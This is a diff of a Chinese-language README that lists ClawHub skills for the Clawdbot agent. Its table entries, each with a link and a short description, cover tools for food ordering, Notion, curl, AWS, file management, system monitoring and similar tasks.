+<td>美食订单</td>
+<td>Food Order</td>
+<td><a href="https://clawdhub.com/skills/food-order">ClawHub/food-order</a></td>
+<td>使用ordercli重新排列Foodora订单并跟踪预计到达时间/状态。未经用户明确批准，切勿确认。触发条件：订餐、重新订购、跟踪预计到达时间。</td>
+</tr>
+<tr>
+<td align="center">191</td>
+<td>NotionAPI工具</td>
+<td>Notion API Tools 🔑</td>
+<td><a href="https://clawdhub.com/skills/notion-api">ClawHub/notion-api</a></td>
+<td>通用 Notion API 命令行工具 (Node)，支持搜索、查询数据源（数据库）及创建页面。通过 NOTION_KEY 或 ~/.config/notion/api_key 进行配置。</td>
+</tr>
+<tr>
+<td align="center">192</td>
+<td>Sysadmin Toolbox</td>
+<td>Sysadmin Toolbox</td>
+<td><a href="https://clawdhub.com/skills/sysadmin-toolbox">ClawHub/sysadmin-toolbox</a></td>
+<td>工具查找与Shell单行命令参考，适用于系统管理、DevOps和安全任务。自动调用时机：排查网络、调试进程、分析日志、SSL/TLS处理、DNS管理、HTTP端点测试、安全审计、容器使用、Shell脚本编写，或询问“用什么工具”。来源：github.com/trimstray/the-book-of-secret-knowledge</td>
+</tr>
+<tr>
+<td align="center">193</td>
+<td>appstore更新日志</td>
+<td>App Store Changelog</td>
+<td><a href="https://clawdhub.com/skills/app-store-changelog">ClawHub/app-store-changelog</a></td>
+<td>通过收集并汇总自上个 Git 标签（或指定引用）以来的所有用户相关变更，生成面向用户的 App Store 更新说明。当需要根据 Git 历史或标签生成完整的更新日志、App Store“新版特性”文本或更新说明时使用。</td>
+</tr>
+<tr>
+<td align="center">194</td>
+<td>Curl Http</td>
+<td>Curl Http</td>
+<td><a href="https://clawdhub.com/skills/curl-http">ClawHub/curl-http</a></td>
+<td>用于HTTP请求、API测试和文件传输的基础curl命令。</td>
+</tr>
+<tr>
+<td align="center">195</td>
+<td>谷歌天气</td>
+<td>Google Weather 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-weather">ClawHub/google-weather</a></td>
+<td>Google天气API - 提供精准、实时天气数据，获取当前天气状况、温度、湿度、风速及预报。依托Google天气API驱动。</td>
+</tr>
+<tr>
+<td align="center">196</td>
+<td>Claude Connect</td>
+<td>Claude Connect</td>
+<td><a href="https://clawdhub.com/skills/claude-connect">ClawHub/claude-connect</a></td>
+<td>即时连接 Claude 与 Clawdbot，24/7 保持连接。设置后运行关联订阅，自动永续刷新令牌。</td>
+</tr>
+<tr>
+<td align="center">197</td>
+<td>Mermaid Diagrams</td>
+<td>Mermaid Diagrams</td>
+<td><a href="https://clawdhub.com/skills/mermaid-diagrams">ClawHub/mermaid-diagrams</a></td>
+<td>使用Mermaid语法创建软件图表。当用户需要通过类图、时序图、流程图、ER图、C4架构图、状态图、Git图等创建、可视化或记录软件时使用。触发词包括绘制图表、可视化、建模、梳理结构或展示系统流程。</td>
+</tr>
+<tr>
+<td align="center">198</td>
+<td>Win Mouse Native (Windows)</td>
+<td>Win Mouse Native (Windows)</td>
+<td><a href="https://clawdhub.com/skills/win-mouse-native">ClawHub/win-mouse-native</a></td>
+<td>通过user32.dll实现原生Windows鼠标控制（移动、点击、拖拽）。当用户要求移动鼠标、点击、拖拽或在Windows上自动化指针操作时使用。</td>
+</tr>
+<tr>
+<td align="center">199</td>
+<td>OCRSpace:免费OCRAPI</td>
+<td>OCR Space: Free OCR API</td>
+<td><a href="https://clawdhub.com/skills/ocr-space">ClawHub/ocr-space</a></td>
+<td>调用 OCR.space 免费 API 识别图片中的文字</td>
+</tr>
+<tr>
+<td align="center">200</td>
+<td>AWSInfra</td>
+<td>AWS Infra</td>
+<td><a href="https://clawdhub.com/skills/aws-infra">ClawHub/aws-infra</a></td>
+<td>基于聊天的 AWS 基础设施辅助，利用 AWS CLI 与控制台上下文；用于查询、审计、监控 AWS 资源（EC2、S3、IAM、Lambda、ECS/EKS、RDS、CloudWatch、计费等），并在写入或破坏性操作前要求明确确认后提出安全变更建议。</td>
+</tr>
+</tbody>
+</table>
 
-### 📁 文件管理
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| Agent Zero Bridge | [Clawdbot/agent-zero-bridge](https://clawdhub.com/skills/agent-zero-bridge) | 将复杂的编码、研究或自主任务委托给零号代理框架。当用户说“询问零号代理”、“委托给 A0”、“构建零号代理”或需要带有自我校正循环的长时间运行的自主编码时使用。支持双向通信、文件附件、任务分解和进度报告。 |
-| 音频内容生成器 | [Clawdbot/audio-gen](https://clawdhub.com/skills/audio-gen) | 按需生成有声读物、播客或教育音频内容。用户提供想法或主题，Claude AI 编写脚本，ElevenLabs 将其转换为高质量音频。支持多种格式（有声读物、播客、教育）、自定义长度和语音效果。当要求创建音频内容、制作播客、生成有声读物或制作教育音频时使用。通过 MEDIA 令牌返回 MP3 音频文件。 |
-| AutoFillIn 表单自动化 | [Clawdbot/autofillin](https://clawdhub.com/skills/autofillin) | 通过 Playwright 浏览器自动化实现自动化网络表单填写和文件上传技能。处理登录持久性、表单检测、文件上传，并在提交前等待手动确认。 |
-| Bluesky 社交网络 | [Clawdbot/bluesky](https://clawdhub.com/skills/bluesky) | 通过 CLI 阅读、发布和与 Bluesky（AT 协议）交互。当用户要求检查 Bluesky、发布到 Bluesky、查看 Bluesky 时间线、搜索 Bluesky 或检查 Bluesky 通知时使用。支持时间线、发布、个人资料查找、搜索和通知。 |
-| Bridle 配置管理 | [Clawdbot/bridle](https://clawdhub.com/skills/bridle) | AI 编码助手的统一配置管理器。管理配置文件、安装技能/代理/命令以及跨 Claude Code、OpenCode、Goose 和 Amp 切换配置。 |
-| Bring 购物清单添加 | [Clawdbot/bring-add](https://clawdhub.com/skills/bring-add) | 当用户想要添加物品到 Bring! 时使用！购物清单。用于添加单个项目、批量项目或来自标准输入/文件的项目。支持试运行预览和 JSON 输出。 |
-| Checkers Sixty60 购物 | [Clawdbot/checkers-sixty60](https://clawdhub.com/skills/checkers-sixty60) | 通过浏览器自动化在 Checkers.co.za Sixty60 送货服务上购物。当用户要求购买杂货、将商品添加到购物车、从 Checkers 订购或管理其 Checkers 购物篮时使用。处理交付类型选择、产品搜索、备份首选项、定期项目重新排序和交易评估。 |
-| Clauditor 审计看门狗 | [Clawdbot/clauditor](https://clawdhub.com/skills/clauditor) | Clawdbot 代理的防篡改审计看门狗。使用 HMAC 链证据检测并记录可疑文件系统活动。 |
-| 文件系统管理 | [Clawdbot/clawdbot-filesystem](https://clawdhub.com/skills/clawdbot-filesystem) | 高级文件系统操作 - Clawdbot 的列表、搜索、批处理和目录分析 |
-| Clawdbot 安全检查 | [Clawdbot/clawdbot-security-check](https://clawdhub.com/skills/clawdbot-security-check) | 对 Clawdbot 自身的配置执行全面的只读安全审核。这是一项基于知识的技能，可教会 Clawdbot 识别整个系统的强化机会。当用户要求“运行安全检查”、“审核clawdbot”、“检查安全强化”或“我的Clawdbot 有哪些漏洞”时使用。此技能使用 Clawdbot 的内部功能和文件系统访问来检查配置、检测错误配置并建议补救措施。它被设计为可扩展的——可以通过更新该技能的知识来添加新的检查。 |
-| Clawdbot 技能更新 | [Clawdbot/clawdbot-skill-update](https://clawdhub.com/skills/clawdbot-skill-update) | 具有动态工作区检测功能的全面备份、更新和恢复工作流程 |
-| Clawdbot 更新增强版 | [Clawdbot/clawdbot-update-plus](https://clawdhub.com/skills/clawdbot-update-plus) | Clawdbot 的完整备份、更新和恢复 - 配置、工作区和具有自动回滚功能的技能 |
-| ClawdHub CLI | [Clawdbot/clawdhub](https://clawdhub.com/skills/clawdhub) | 使用 ClawdHub CLI 从clawdhub.com 搜索、安装、更新和发布代理技能。当您需要动态获取新技能、将已安装的技能同步到最新版本或特定版本，或者使用 npm 安装的clawdhub CLI 发布新的/更新的技能文件夹时使用。 |
-| ClawdHub CLI | [Clawdbot/clawdhub-bak-2026-01-28t18-01-16-10-30](https://clawdhub.com/skills/clawdhub-bak-2026-01-28t18-01-16-10-30) | 使用 ClawdHub CLI 从clawdhub.com 搜索、安装、更新和发布代理技能。当您需要动态获取新技能、将已安装的技能同步到最新版本或特定版本，或者使用 npm 安装的clawdhub CLI 发布新的/更新的技能文件夹时使用。 |
-| 代码解释器 | [Clawdbot/code-explainer](https://clawdhub.com/skills/code-explainer) | 用简单的英语解释任何代码文件。当您需要理解不熟悉的代码时使用。 |
-| Copilot Money 财务管理 | [Clawdbot/copilot-money](https://clawdhub.com/skills/copilot-money) | 查询Copilot Money个人财务数据（账户、交易、净值、持仓、资产配置）并刷新银行连接。当用户询问财务、账户余额、最近交易、净值、投资分配或想要同步/刷新银行数据时使用。 |
-| Council of the Wise | [Clawdbot/council-of-the-wise](https://clawdhub.com/skills/council-of-the-wise) | 将想法发送给智者委员会以获得多角度反馈。产生子代理以从多个专家角度进行分析。从代理/文件夹中自动发现代理角色。 |
-| CSS to Tailwind 转换器 | [Clawdbot/css-to-tailwind](https://clawdhub.com/skills/css-to-tailwind) | 将 CSS 文件转换为 Tailwind 实用程序类。从 vanilla CSS 迁移到 Tailwind 时使用。 |
-| 每日回顾 | [Clawdbot/daily-recap](https://clawdhub.com/skills/daily-recap) | 生成每日回顾图片，让您的代理拿着成就海报板。 Cron 驱动、天气感知、可针对任何代理身份进行定制。 |
-| 数据协调异常 | [Clawdbot/data-reconciliation-exceptions](https://clawdhub.com/skills/data-reconciliation-exceptions) | 使用稳定的标识符（工资号、驾驶执照、驾驶员卡和驾驶员资格卡号）协调数据源，生成异常报告和“无静默故障”检查。当您需要每周匹配并明确未连接和不匹配的原因时使用。 |
-| Dex 任务跟踪 | [Clawdbot/dex](https://clawdhub.com/skills/dex) | 异步/多步骤工作的任务跟踪。使用 dex 创建、跟踪和完成跨越多个会话或需要协调的任务（例如，编码代理调度、PR 审查、后台作业）。任务以 JSON 文件形式存储在 .dex/tasks/ 中。 |
-| Dropbox 管理器 | [Clawdbot/dropbox](https://clawdhub.com/skills/dropbox) | （无） |
-| DuckDB CLI | [Clawdbot/duckdb-cli-ai-skills](https://clawdhub.com/skills/duckdb-cli-ai-skills) | DuckDB CLI 专家，用于 SQL 分析、数据处理和文件转换。用于 SQL 查询、CSV/Parquet/JSON 分析、数据库查询或数据转换。在“duckdb”、“sql”、“查询”、“数据分析”、“parquet”、“转换数据”上触发。 |
-| E2E 测试生成器 | [Clawdbot/e2e-writer](https://clawdhub.com/skills/e2e-writer) | 从 URL 或组件文件生成 Playwright 端到端测试。当您需要快速进行端到端测试覆盖时使用。 |
-| ElevenLabs 语音转文本 | [Clawdbot/elevenlabs-stt](https://clawdhub.com/skills/elevenlabs-stt) | 使用 ElevenLabs Speech-to-Text (Scribe v2) 转录音频文件。 |
-| entr 文件监控 | [Clawdbot/entr](https://clawdhub.com/skills/entr) | 文件更改时运行任意命令。对于监视文件和触发构建或测试很有用。 |
-| 环境变量同步 | [Clawdbot/env-sync](https://clawdhub.com/skills/env-sync) | 从 .env 文件生成 .env.example。在开发人员入职时使用。 |
-| Garmin 健康分析 | [Clawdbot/garmin-health-analysis](https://clawdhub.com/skills/garmin-health-analysis) | 自然地谈论您的 Garmin 数据 - “我滑雪的最快速度是多少？”、“我昨晚睡得怎么样？”、“下午 3 点我的心率是多少？”。访问 20 多个指标（睡眠阶段、身体电池、HRV、最大摄氧量、训练准备情况、身体成分、SPO2）、下载 FIT/GPX 文件进行路线分析、查询任意点的海拔/步速，并生成交互式健康仪表板。从随意的“向我展示本周的锻炼”到深入的“分析我的恢复与训练负荷”。 |
-| Gemini 语音转文本 | [Clawdbot/gemini-stt](https://clawdhub.com/skills/gemini-stt) | 使用 Google 的 Gemini API 或 Vertex AI 转录音频文件 |
-| Git-Crypt Backup | [Clawdbot/git-crypt-backup](https://clawdhub.com/skills/git-crypt-backup) | 使用 git-crypt 加密将 Clawdbot 工作区和配置备份到 GitHub。用于日常自动备份或手动备份/恢复操作。 |
-| GitLoad GitHub 文件下载 | [Clawdbot/gitload](https://clawdhub.com/skills/gitload) | 当用户要求“从 GitHub 下载文件”、“从存储库获取文件夹”、“从 GitHub 获取代码”、“下载 GitHub 存储库”、“从 GitHub URL 获取文件”、“仅克隆文件夹”，或者需要从 GitHub 下载特定文件/文件夹而不克隆整个存储库时，应使用此技能。 |
-| Instagram CLI | [Clawdbot/gram](https://clawdhub.com/skills/gram) | Instagram CLI，用于通过 cookie 查看提要、帖子、个人资料和参与度。 |
-| iCloud 查找我的设备 | [Clawdbot/icloud-findmy](https://clawdhub.com/skills/icloud-findmy) | 通过 iCloud 查询家庭设备的“查找我的位置”和电池状态。 |
-| iCloud Reminders | [Clawdbot/icloud-reminders](https://clawdhub.com/skills/icloud-reminders) | 适用于 iOS 13+ 提醒的 CloudKit API 访问。创建、阅读、更新、删除带有截止日期、警报、标签、优先级和重复周期的提醒。用于任何提醒/待办事项/任务管理请求。 |
-| 数据库索引建议器 | [Clawdbot/index-gen](https://clawdhub.com/skills/index-gen) | 从查询模式中获取智能数据库索引建议。当查询速度慢时使用。 |
-| Instapaper | [Clawdbot/instapaper](https://clawdhub.com/skills/instapaper) | 在操作 instapaper-cli (ip) 工具或对其进行故障排除时使用：身份验证、列出/导出/导入书签、批量更改、文件夹/突出显示/文本、选择输出格式 (ndjson/json/plain)、基于光标的同步以及解释 stderr-json/退出代码以实现自动化。 |
-| Joan 知识管理 | [Clawdbot/joan-workflow](https://clawdhub.com/skills/joan-workflow) | 当用户询问“joan”、“pods”、“工作空间”、“领域知识”、“上下文同步”、“joan init”、“joan todo”，或者需要有关 Joan 的知识管理系统如何工作的指导时，应该使用此技能。提供 Pod、待办事项、计划和工作区管理的工作流程指南。 |
-| K8s 备份 | [Clawdbot/k8s-backup](https://clawdhub.com/skills/k8s-backup) | 使用 Velero 进行 Kubernetes 备份和恢复。在创建备份、恢复应用程序、管理灾难恢复或在集群之间迁移工作负载时使用。 |
-| Linear 自动处理 | [Clawdbot/linear-autopilot](https://clawdhub.com/skills/linear-autopilot) | 使用 Discord 通知和 git 同步自动执行线性任务处理。在设置看板到代理工作流程时使用，其中线性任务通过 Discord 触发 Clawdbot 操作。处理任务接收、状态更新、DM 通知和自动推送到 git。支持任何任务类型 - 研究、内容创建、代码任务或自定义工作流程。 |
-| LinkedIn 自动化 | [Clawdbot/linkedin](https://clawdhub.com/skills/linkedin) | LinkedIn 通过浏览器中继或 cookie 实现消息传递、个人资料查看和网络操作的自动化。 |
-| LinkedIn CLI | [Clawdbot/linkedin-cli](https://clawdhub.com/skills/linkedin-cli) | 类似鸟类的 LinkedIn CLI，用于搜索个人资料、检查消息并使用会话 cookie 总结您的提要。 |
-| Linux 服务诊断 | [Clawdbot/linux-service-triage](https://clawdhub.com/skills/linux-service-triage) | 使用日志、systemd/PM2、文件权限、Nginx 反向代理检查和 DNS 健全性检查来诊断常见的 Linux 服务问题。当服务器应用程序出现故障、无法访问或配置错误时使用。 |
-| Little Snitch 防火墙 | [Clawdbot/little-snitch](https://clawdhub.com/skills/little-snitch) | 控制 macOS 上的 Little Snitch 防火墙。查看日志、管理配置文件和规则组、监控网络流量。当用户想要检查防火墙活动、启用/禁用配置文件或阻止列表或排除网络连接故障时使用。 |
-| Lyric Translator | [Clawdbot/lyric-translator](https://clawdhub.com/skills/lyric-translator) | 将印度尼西亚歌词翻译成听起来自然的英语。当贝拉里奥时使用 需要翻译他们的印尼语歌词以供国际发行、同步 许可或与英语艺术家合作。适用人性化 确保翻译真实、富有诗意和人为书写的技术—— 绝不是机器人或人工智能生成的。保持节奏、音节流畅和情感 原文的意图。 |
-| mactop 硬件监控 | [Clawdbot/mactop](https://clawdhub.com/skills/mactop) | 使用 mactop 的 TOON 格式从 Apple Silicon Mac 检索实时硬件指标。 提供 CPU、RAM、GPU、电源、散热、网络、磁盘 I/O 和 Thunderbolt 总线信息。 当用户需要 Apple Silicon Mac 上的系统统计数据、硬件监控或性能指标时使用。 |
-| 数据库迁移生成器 | [Clawdbot/migration-gen](https://clawdhub.com/skills/migration-gen) | 从 ORM 模式生成 SQL 迁移文件。在管理数据库更改时使用。 |
-| Mole Mac 清理 | [Clawdbot/mole-mac-cleanup](https://clawdhub.com/skills/mole-mac-cleanup) | Mac 清理和优化工具结合了 CleanMyMac、AppCleaner、DaisyDisk 功能。深度清理、智能卸载程序、磁盘洞察和项目工件清除。 |
-| Moltbot 安全 | [Clawdbot/moltbot-security](https://clawdhub.com/skills/moltbot-security) | Moltbot/Clawdbot 安全强化指南。锁定网关、修复文件权限、设置身份验证、配置防火墙。基于真实的漏洞研究。 |
-| 原生应用性能分析 | [Clawdbot/native-app-performance](https://clawdhub.com/skills/native-app-performance) | 通过 xctrace/Time Profiler 进行本机 macOS/iOS 应用程序性能分析以及仅 CLI 分析仪器跟踪。当要求在不打开 Instruments UI 的情况下分析、附加、记录或分析 Instruments .trace 文件、查找热点或优化本机应用程序性能时使用。 |
-| OmniFocus 自动化 | [Clawdbot/omnifocus-automation](https://clawdhub.com/skills/omnifocus-automation) | 通过 Omni Automation 管理 OmniFocus 任务、项目和文件夹。用于任务管理、待办事项列表、项目跟踪、GTD 工作流程、添加/完成/编辑任务、设置截止日期、管理标签和重复任务。需要在 macOS 上安装 OmniFocus。 |
-| OpenRouter 转录 | [Clawdbot/openrouter-transcribe](https://clawdhub.com/skills/openrouter-transcribe) | 使用支持音频的模型（Gemini、GPT-4o-audio 等）通过 OpenRouter 转录音频文件。 |
-| Oracle 代码审查 | [Clawdbot/oracle](https://clawdhub.com/skills/oracle) | 使用 @steipete/oracle CLI 捆绑提示和正确的文件，并获得第二模型审查（API 或浏览器）以进行调试、重构、设计检查或交叉验证。 |
-| Pocket Casts YouTube | [Clawdbot/pocket-casts-yt](https://clawdhub.com/skills/pocket-casts-yt) | 下载 YouTube 视频并将其上传到 Pocket Casts 文件以供离线观看。供个人使用您拥有或有权使用的内容。 |
-| 进程监控 | [Clawdbot/process-watch](https://clawdhub.com/skills/process-watch) | 监视系统进程 - CPU、内存、磁盘 I/O、网络、打开的文件、端口。查找资源占用者、终止失控进程、跟踪消耗计算机的内容。 |
-| Prowlarr | [Clawdbot/prowlarr](https://clawdhub.com/skills/prowlarr) | 搜索索引器并管理 Prowlar。当用户要求“搜索 torrent”、“搜索索引器”、“查找版本”、“检查索引器状态”、“列出索引器”、“prowlarr 搜索”、“同步索引器”或提及 Prowlarr/索引器管理时使用。 |
-| Proxmox 管理 | [Clawdbot/proxmox-full](https://clawdhub.com/skills/proxmox-full) | 完整的 Proxmox VE 管理 - 创建/克隆/启动/停止 VM 和 LXC 容器，管理快照、备份、存储和模板。当用户想要管理 Proxmox 基础设施、虚拟机或容器时使用。 |
-| put.io 管理 | [Clawdbot/putio](https://clawdhub.com/skills/putio) | 通过 kaput CLI 管理 put.io 帐户（传输、文件、搜索）——升起主帆、添加磁铁/URL 并检查传输状态；最好与寒冷学院技能搭配使用。 |
-| R2 文件上传 | [Clawdbot/r2-upload](https://clawdhub.com/skills/r2-upload) | 将文件上传到 Cloudflare R2、AWS S3 或任何与 S3 兼容的存储，并生成具有可配置过期时间的安全预签名下载链接。 |
-| SF Symbol 生成器 | [Clawdbot/sfsymbol-generator](https://clawdhub.com/skills/sfsymbol-generator) | 从 SVG 生成 Xcode SF Symbol 资源目录 .symbolset。当您需要通过创建符号集文件夹、Contents.json 和 SVG 文件来添加自定义 SF 符号（构建时）时使用。 |
-| 快捷方式生成器 | [Clawdbot/shortcuts-skill](https://clawdhub.com/skills/shortcuts-skill) | 通过创建 plist 文件生成 macOS/iOS 快捷方式。当要求创建快捷方式、自动化工作流程、构建 .shortcut 文件或生成快捷方式 plist 时使用。涵盖 1,155 个操作（427 个 WF*Actions + 728 个 AppIntents）、变量引用和控制流。 |
-| Swift 并发专家 | [Clawdbot/swift-concurrency-expert](https://clawdhub.com/skills/swift-concurrency-expert) | Swift 6.2+ 的 Swift 并发审查和修复。当要求检查 Swift 并发使用情况、提高并发合规性或修复功能或文件中的 Swift 并发编译器错误时使用。 |
-| SwiftUI Empty App Init | [Clawdbot/swiftui-empty-app-init](https://clawdhub.com/skills/swiftui-empty-app-init) | 通过使用 XcodeGen 生成单个“.xcodeproj”，在当前目录中初始化一个最小的 SwiftUI iOS 应用程序（除非明确请求，否则没有工作区、包或测试）。 |
-| SwiftUI UI Patterns | [Clawdbot/swiftui-ui-patterns](https://clawdhub.com/skills/swiftui-ui-patterns) | 用于构建 SwiftUI 视图和组件的最佳实践和示例驱动指南。在创建或重构 SwiftUI UI、使用 TabView 设计选项卡架构、组合屏幕或需要特定于组件的模式和示例时使用。 |
-| SwiftUI 视图重构 | [Clawdbot/swiftui-view-refactor](https://clawdhub.com/skills/swiftui-view-refactor) | 重构并审查 SwiftUI 视图文件以实现一致的结构、依赖项注入和观察使用。当被要求清理 SwiftUI 视图的布局/排序、安全地处理视图模型（如果可能时为非可选）或标准化依赖项和 @Observable 状态的初始化和传递方式时使用。 |
-| 测试生成器 | [Clawdbot/test-gen](https://clawdhub.com/skills/test-gen) | 使用 AI 从源文件生成单元测试。添加测试覆盖率时使用。 |
-| 测试编写器 | [Clawdbot/test-writer](https://clawdhub.com/skills/test-writer) | 从源文件生成单元测试。当您需要快速测试覆盖率时使用。 |
-| jj | [Clawdbot/tt](https://clawdhub.com/skills/tt) | 通过 wacli CLI 向其他人发送 WhatsApp 消息或搜索/同步 WhatsApp 历史记录（不适用于普通用户聊天）。 |
-| Unraid 服务器 | [Clawdbot/unraid](https://clawdhub.com/skills/unraid) | 通过 GraphQL API 查询和监控 Unraid 服务器。当用户要求“检查 Unraid”、“监视 Unraid”、“Unraid API”、“获取 Unraid 状态”、“检查磁盘温度”、“读取 Unraid 日志”、“列出 Unraid 共享”、“Unraid 阵列状态”、“Unraid 容器”、“Unraid 虚拟机”或提及 Unraid 系统监控、磁盘运行状况、奇偶校验检查或服务器状态时使用。 |
-| Wacli | [Clawdbot/wacli](https://clawdhub.com/skills/wacli) | 通过 wacli CLI 向其他人发送 WhatsApp 消息或搜索/同步 WhatsApp 历史记录（不适用于普通用户聊天）。 |
-| Wallapop CLI | [Clawdbot/wallapop-cli](https://clawdhub.com/skills/wallapop-cli) | 使用 wallapop CLI 搜索列表、获取项目详细信息、查看用户配置文件和列出类别。当用户请求 Wallapop 市场数据或当您需要 CLI 命令和用于 wallapop-cli 使用的标志时应用。 |
-| Web 性能分析 | [Clawdbot/web-perf](https://clawdhub.com/skills/web-perf) | 使用 Chrome DevTools MCP 分析 Web 性能。测量核心 Web 生命（FCP、LCP、TBT、CLS、速度指数），识别渲染阻塞资源、网络依赖链、布局变化、缓存问题和可访问性差距。当要求审核、分析、调试或优化页面加载性能、Lighthouse 分数或站点速度时使用。 |
-| What's app | [Clawdbot/whats](https://clawdhub.com/skills/whats) | 通过 wacli CLI 向其他人发送 WhatsApp 消息或搜索/同步 WhatsApp 历史记录（不适用于普通用户聊天）。 |
-| Willhaben CLI | [Clawdbot/whcli](https://clawdhub.com/skills/whcli) | Willhaben CLI 用于搜索奥地利最大的分类广告市场。搜索列表、查看详细信息、检查卖家资料。 |
-| Workout 追踪 | [Clawdbot/workout](https://clawdhub.com/skills/workout) | 使用锻炼-cli 跟踪锻炼、记录集、管理锻炼和模板。支持多用户配置文件。在帮助用户记录健身课程、查看历史记录或分析力量进展时使用。 |
+---
 
-### 📊 系统监控
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| ADHD 每日规划器 | [Clawdbot/adhd-daily-planner](https://clawdhub.com/skills/adhd-daily-planner) | 多动症大脑的时间盲友好型规划、执行功能支持和日常结构。专门从事现实的时间估计、多巴胺感知任务设计，以及构建实际适用于神经发散性思维的系统。 |
-| Anova 精密烤箱控制 | [Clawdbot/anova-skill](https://clawdhub.com/skills/anova-skill) | 通过 WiFi WebSocket API 控制 Anova 精密烤箱和精密炊具（真空低温烹调）。启动烹饪模式（真空低温烹调、烘烤、蒸汽）、设置温度、监控状态并远程停止烹饪。 |
-| ArXiv 观察器 | [Clawdbot/arxiv-watcher](https://clawdhub.com/skills/arxiv-watcher) | 从 ArXiv 搜索并总结论文。当用户询问最新研究、ArXiv 上的特定主题或 AI 论文的每日摘要时使用。 |
-| ArXiv 观察器 | [Clawdbot/arxiv-watcher-vigo](https://clawdhub.com/skills/arxiv-watcher-vigo) | 从 ArXiv 搜索并总结论文。当用户询问最新研究、ArXiv 上的特定主题或 AI 论文的每日摘要时使用。 |
-| 航班追踪器 | [Clawdbot/aviationstack-flight-tracker](https://clawdhub.com/skills/aviationstack-flight-tracker) | 实时跟踪航班的详细状态、登机口信息、延误和实时位置。当用户要求跟踪航班、检查航班状态、按航班号查找航班信息（例如，“跟踪 AA100”、“United 2402 的状态如何”、“检查我的航班 BA123”）或想要以类似于 Flighty 应用程序的格式化视图显示航班数据时使用。 |
-| AWS 基础设施管理 | [Clawdbot/aws-infra](https://clawdhub.com/skills/aws-infra) | 使用 AWS CLI 和控制台上下文提供基于聊天的 AWS 基础设施帮助。用于查询、审核和监控 AWS 资源（EC2、S3、IAM、Lambda、ECS/EKS、RDS、CloudWatch、计费等），以及在任何写入/破坏性操作之前提出安全更改并进行明确确认。 |
-| Azure 基础设施管理 | [Clawdbot/azure-infra](https://clawdhub.com/skills/azure-infra) | 使用 Azure CLI 和门户上下文提供基于聊天的 Azure 基础结构帮助。用于查询、审核和监视 Azure 资源（VM、存储、IAM、函数、AKS、应用服务、Key Vault、Azure Monitor、计费等），并用于在任何写入/破坏性操作之前通过明确确认提出安全更改。 |
-| Base 交易者 | [Clawdbot/base-trader](https://clawdhub.com/skills/base-trader) | 通过 Bankr 在 Base 上进行自主加密货币交易。用于交易代币、监控发布、执行策略或管理交易组合。触发“交易”、“买入”、“卖出”、“启动”、“狙击”、“利润”、“盈亏”、“投资组合余额”或 Base 上的任何加密货币交易任务。 |
-| Blogwatcher RSS 监控 | [Clawdbot/blogwatcher](https://clawdhub.com/skills/blogwatcher) | 使用 blogwatcher CLI 监视博客和 RSS/Atom 源的更新。 |
-| 缓存策略 | [Clawdbot/cache-strategy](https://clawdhub.com/skills/cache-strategy) | 为您的 API 获取由 AI 支持的缓存策略建议。当性能很重要时使用。 |
-| 缓存策略生成器 | [Clawdbot/cache-strategy-gen](https://clawdhub.com/skills/cache-strategy-gen) | 为您的 API 获取由 AI 支持的缓存策略建议。当性能很重要时使用。 |
-| CamelCamelCamel 价格提醒 | [Clawdbot/camelcamelcamel-alerts](https://clawdhub.com/skills/camelcamelcamel-alerts) | 通过 RSS 监控 CamelCamelCamel 降价提醒，并在商品打折时发送 Telegram 通知。使用 CamelCamelCamel 价格提醒设置亚马逊产品的自动价格跟踪时使用。 |
-| Claude Code 使用统计 | [Clawdbot/claude-code-usage](https://clawdhub.com/skills/claude-code-usage) | 检查 Claude Code OAuth 使用限制（会话和每周配额）。当用户询问 Claude Code 使用情况、剩余限制、速率限制或剩余的 Claude 使用量时使用。包括自动会话刷新提醒和重置检测监控。 |
-| Claude Code Wingman | [Clawdbot/claude-code-wingman](https://clawdhub.com/skills/claude-code-wingman) | 您的 Claude Code 僚机 - 跨项目编排多个 Claude Code 会话，通过 WhatsApp 监控所有会话 |
-| Claude Team | [Clawdbot/claude-team](https://clawdhub.com/skills/claude-team) | 使用 claude-team MCP 服务器通过 iTerm2 协调多个 Claude Code 工作人员。使用 git 工作树生成工作人员、分配珠子问题、监控进度并协调并行开发工作。 |
-| Clawdbot 日志 | [Clawdbot/clawdbot-logs](https://clawdhub.com/skills/clawdbot-logs) | 分析 Clawdbot 日志和诊断。当用户询问机器人性能、响应时间、错误、会话统计信息、令牌使用情况、API 成本或想要调试缓慢响应时使用。 |
-| Clawdbot 安全套件 | [Clawdbot/clawdbot-security-suite](https://clawdhub.com/skills/clawdbot-security-suite) | Clawdbot 的高级安全验证 - 模式检测、命令清理和威胁监控 |
-| 编码代理 | [Clawdbot/coding-agent](https://clawdhub.com/skills/coding-agent) | 通过后台进程运行 Codex CLI、Claude Code、OpenCode 或 Pi Coding Agent 以进行编程控制。 |
-| 航班追踪器 | [Clawdbot/copey-flight-tracker](https://clawdhub.com/skills/copey-flight-tracker) | 实时跟踪航班的详细状态、登机口信息、延误和实时位置。当用户要求跟踪航班、检查航班状态、按航班号查找航班信息（例如，“跟踪 AA100”、“United 2402 的状态如何”、“检查我的航班 BA123”）或想要以类似于 Flighty 应用程序的格式化视图显示航班数据时使用。 |
-| Council | [Clawdbot/council](https://clawdhub.com/skills/council) | 理事会会议厅与 Memory Bridge 的编排。单次会议、多个角色、结构化审议。 |
-| CPC/MPQC 能力跟踪（英国） | [Clawdbot/cpc-mpqc-competence-tracker-compliance-uk](https://clawdhub.com/skills/cpc-mpqc-competence-tracker-compliance-uk) | 通过提醒、证据列表和合规报告来计划 CPC/MPQC 能力跟踪。在保持培训/认证准备状态时使用。 |
-| 加密货币追踪器 | [Clawdbot/crypto-tracker](https://clawdhub.com/skills/crypto-tracker) | 通过 CoinGecko API 跟踪加密货币价格、设置警报和搜索硬币。 |
-| 数据转换生成器 | [Clawdbot/data-transform-gen](https://clawdhub.com/skills/data-transform-gen) | 生成 ETL 和数据转换脚本。在系统之间迁移数据时使用。 |
-| Dexcom CGM 血糖监测 | [Clawdbot/dexcom](https://clawdhub.com/skills/dexcom) | 通过 Dexcom G7/G6 CGM 监测血糖 |
-| ElevenLabs Voices | [Clawdbot/elevenlabs-voices](https://clawdhub.com/skills/elevenlabs-voices) | 使用 ElevenLabs API 进行高质量语音合成，具有 18 种角色、32 种语言、音效、批处理和语音设计。 |
-| 费用追踪 Pro | [Clawdbot/expense-tracker-pro](https://clawdhub.com/skills/expense-tracker-pro) | 通过自然语言跟踪支出、获取支出摘要、设定预算 |
